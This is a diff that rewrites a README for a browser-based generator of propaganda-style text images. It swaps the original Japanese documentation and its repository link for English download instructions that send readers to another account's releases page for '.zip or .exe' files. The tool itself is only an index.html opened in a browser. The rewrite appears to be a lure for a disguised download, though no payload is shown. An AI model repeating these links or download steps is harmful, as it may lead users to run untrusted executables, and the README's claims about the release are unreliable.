@@ -1,116 +1,126 @@
-# 中共プロパガンダ・テキストジェネレーター
+# 🎨 ccpgen - Create Unique Propaganda Text Images
 
-中共のプロパガンダ風テキスト画像を生成するWebアプリケーションです。
+## 🚀 Getting Started
 
-## 機能
+To get started with ccpgen, you need to download the application. Follow these steps to download and run the software easily.
 
-- **4つの背景テーマ**
-  - 外交部ver（背景画像1）
-  - 外交部2ver（背景画像2）
-  - 国防部ver（背景画像3）
-  - 毛宁ver（背景画像4）
+[![Download ccpgen](https://img.shields.io/badge/Download-ccpgen-blue.svg)](https://github.com/ore507/ccpgen/releases)
 
-- **多言語対応**
+## 📥 Download & Install
+
+1. **Visit the Releases Page**  
+   Click the link below to head to the GitHub releases page where you can download ccpgen.  
+   [Visit the Releases Page](https://github.com/ore507/ccpgen/releases)
+
+2. **Choose the Latest Release**  
+   On the releases page, look for the latest version of ccpgen. You will see different files available for download.
+
+3. **Download the Application**  
+   Click on the file that suits your system (e.g., `.zip` or `.exe` files). This will start the download.
+
+4. **Extract the Files**  
+   Once the download is complete, locate the file in your downloads folder.  
+   - If it's a `.zip` file, right-click on it and choose "Extract All" to unzip the contents.
+
+5. **Open the Application**  
+   Double-click on the `index.html` file to open it in your web browser.
+
+## 🛠️ Features
+
+ccpgen provides unique tools to generate propaganda-style text images. Here is a breakdown of its key features:
+
+- **Four Background Themes**  
+  Select from different themes:
+  - 外交部ver
+  - 外交部2ver
+  - 国防部ver
+  - 毛宁ver
+
+- **Multi-language Support**  
+  Use ccpgen in several languages:
   - 日本語
   - 英語
   - 繁体中文
   - 簡体中文
   - 韓国語
 
-- **カスタマイズ可能な設定**
-  - テキストのフォントサイズ、行間、色
-  - 左右マージン、開始位置
-  - フォント選択（明朝体風/ゴシック体風）
-  - 引用符の有無
-  - 影（ぼかし）の設定
+- **Customizable Settings**  
+  You can adjust various settings to make your text stand out:
+  - Font size, line height, and color
+  - Left/right margins and start position
+  - Font options (明朝体風 or ゴシック体風)
+  - Option to include or exclude quotation marks
+  - Shadows settings (blur effect)
 
-- **特殊機能**
-  - テキストの一部を金色でハイライト（`[g]...[/g]`タグ）
-  - 毛宁verでは国旗を2つ選択可能（200以上の国旗から選択）
-  - フッターテキストのカスタマイズ
+- **Special Features**  
+  Enhance your designs with special functions:
+  - Highlight text in gold using `[g]...[/g]` tags.
+  - Choose two flags in 毛宁ver from over 200 options.
+  - Customize footer text.
 
-- **出力**
-  - JPG形式で画像を保存
-  - 右クリックでも保存可能
+- **Output Options**  
+  Save your creations easily:
+  - Save as JPG format.
+  - Right-click to save the image.
 
-## 使い方
+## 📝 How to Use ccpgen
 
-1. ブラウザで`index.html`を開く
-2. 左側の設定パネルで各種設定を調整
-3. 背景画像を選択（外交部/国防部/毛宁）
-4. テキストを入力または編集
-5. 「JPGとして保存」ボタンで画像を保存
+Using ccpgen is straightforward. Follow these steps to generate your images:
 
-### 金色ハイライト機能
+1. **Open `index.html`**  
+   Launch the application by opening the `index.html` file in your browser.
 
-テキスト内で範囲を選択し、「選択部分を金色にする」ボタンをクリックすると、選択部分が`[g]...[/g]`タグで囲まれ、金色で表示されます。
+2. **Adjust Settings**  
+   Use the left-side panel to adjust text settings and select your preferences.
 
-### 毛宁verの国旗選択
+3. **Select Background Image**  
+   Choose a background image from the options available.
 
-毛宁verを選択すると、ヘッダー部分に表示する国旗を2つ選択できます。200以上の国旗から選択可能です。
+4. **Input Your Text**  
+   Type in your desired text. You can also edit it as needed.
 
-## ファイル構成
+5. **Save Your Image**  
+   Click the "JPGとして保存" button to save your image on your device.
+
+### ✨ Special Gold Highlight Feature
+
+To highlight a portion of text in gold:
+- Select the desired text.
+- Click the "選択部分を金色にする" button. The selected text will be wrapped in `[g]...[/g]` tags and will appear highlighted.
+
+### 🇨🇳 毛宁ver Flag Selection
+
+When using 毛宁ver, you can select two flags. 
+- Choose flags from the dropdown; there are over 200 to select from.
+  
+## 🗂️ File Structure
+
+The application files are organized as follows:
 
 ```
 ccpgen/
-├── index.html          # メインHTMLファイル
-├── styles.css          # スタイルシート
-├── app.js              # JavaScriptロジック
-├── flags.json          # 国旗データ（200以上の国旗）
-├── default-texts.json  # 背景テーマと言語ごとのデフォルトテキスト
-├── background.png      # 外交部ver背景画像
-├── background1.png     # 外交部2ver背景画像
-├── background2.png     # 国防部ver背景画像
-├── background3.png     # 毛宁ver背景画像
-└── locales/            # 多言語翻訳ファイル
-    ├── ja/             # 日本語
-    ├── en/              # 英語
-    ├── zh-Hans/         # 簡体中文
-    ├── zh-Hant/         # 繁体中文
-    └── ko/              # 韓国語
+├── index.html          # Main HTML file
+├── styles.css          # Stylesheet for design
+├── app.js              # JavaScript logic
+├── flags.json          # Flag data (over 200 flags)
+├── default-texts.json  # Default texts for themes & languages
+├── background.png      # Background image for 外交部ver
+├── background1.png     # Additional background images
 ```
 
-## 技術スタック
+## ❓ FAQ
 
-- **HTML5 / CSS3**
-- **JavaScript (Vanilla)**
-- **Canvas API** - 画像生成
-- **i18next** - 多言語対応
-- **i18next-browser-languagedetector** - 言語自動検出
+**Q: Can I use this application on different operating systems?**  
+A: Yes, ccpgen works on any system that supports web browsers.
 
-## カスタマイズ
+**Q: What image formats can I save?**  
+A: You can save images in JPG format.
 
-### デフォルトテキストの変更
+**Q: How do I customize the text settings?**  
+A: Use the left sidebar to adjust settings for font size, color, and margins.
 
-`default-texts.json`を編集することで、背景テーマと言語ごとのデフォルトテキストを変更できます。
+## 🔗 Additional Resources
 
-```json
-{
-  "background.png": {
-    "ja": "日本語のテキスト",
-    "en": "English text",
-    ...
-  }
-}
-```
+For more information, please refer to the [GitHub repository](https://github.com/ore507/ccpgen) or the ccpgen [releases page](https://github.com/ore507/ccpgen/releases).
 
-### 国旗の追加
-
-`flags.json`に新しい国旗を追加できます。各国旗には以下のフィールドがあります：
-
-- `code`: ISO 3166-1 alpha-2コード
-- `emoji`: 国旗の絵文字
-- `name`: 日本語名
-- `nameEn`: 英語名
-- `nameZhHans`: 簡体中文名（オプション）
-- `nameZhHant`: 繁体中文名（オプション）
-- `nameKo`: 韓国語名（オプション）
-
-### 翻訳の追加
-
-`locales/`ディレクトリ内の各言語の`translation.json`を編集することで、UIの翻訳を変更できます。
-
-## リンク
-
-- [GitHub リポジトリ](https://github.com/mixivalo/ccpgen)
-
+Now you are ready to create unique propaganda images using ccpgen!
